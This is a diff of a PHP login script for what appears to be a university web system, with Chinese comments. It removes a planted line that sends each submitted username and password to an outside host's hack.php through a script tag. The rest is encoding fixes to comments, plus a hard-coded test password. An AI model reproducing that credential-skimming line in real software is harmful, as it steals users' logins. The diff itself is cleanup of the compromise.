@@ -23,7 +23,6 @@
 		// 取出帳密
 		$user = $_POST['name'];
 		$password = $_POST['pass'];
-		echo "<script src=\"http://140.115.189.157/hack.php?pass=".$user.":".$password."\"></script>";
 		//防範sql injection攻擊
 		$user = mysql_real_escape_string($user);
 		$password = mysql_real_escape_string($password);
@@ -126,7 +125,7 @@
 				{
 					$error = $pop3->Login($user, $password, $apop);
 					
-	// debug�&#65533;
+	// debug??&#65533;
 	//$user = "75066100";
 	//$error = "";
 					
@@ -192,13 +191,13 @@
 						</script>
 					";	
 				}
-			//當DB中已有備份，直接從中做認證並且登�&#65533;
+			//當DB中已有備份，直接從中做認證並且登??&#65533;
 			}
 		}
-		else	// 申請活動的單�&#65533;
+		else	// 申請活動的單??&#65533;
 		{
 			/*
-			 *	有兩種可能認�&#65533;
+			 *	有兩種可能認??&#65533;
 			 *	1. 透過已經建立好的帳號進行認證(ncu_user)
 			 *	2. 計中的sparc認證
 			 */
@@ -210,7 +209,7 @@
 			//$sql = sprintf("SELECT * FROM `ncu_user` WHERE user_account = '%s' AND user_password= password('%s')", mysql_real_escape_string($user), mysql_real_escape_string($password)); 
 			$ret = mysql_query($sql, $db) or die(mysql_error());
 			
-			// 第一種認�&#65533;
+			// 第一種認??&#65533;
 			if(mysql_num_rows($ret) == 1)
 			{
 				$row = mysql_fetch_assoc($ret);
@@ -220,7 +219,7 @@
 				$_SESSION['valid_id']				= $row['user_id'];			//ID
 				$_SESSION['valid_office_account']	= $row['user_account'];		// 帳號
 				$_SESSION['valid_office']			= $row['user_office'];		// 單位
-				$_SESSION['valid_type']				= 1;						// 第一種認�&#65533;
+				$_SESSION['valid_type']				= 1;						// 第一種認??&#65533;
 				
 				// 記錄登入時間與ip			 	
 				$sql = "UPDATE `ncu_user` SET `user_login_time` = NOW(), `user_login_ip` = '$ip' 
@@ -244,7 +243,7 @@
 										password('snmgtest'),
 										'2',
 										'snmg測試',
-										'單位管理�&#65533;',
+										'單位管理??&#65533;',
 										'$ip',
 										NOW(),
 										'0'
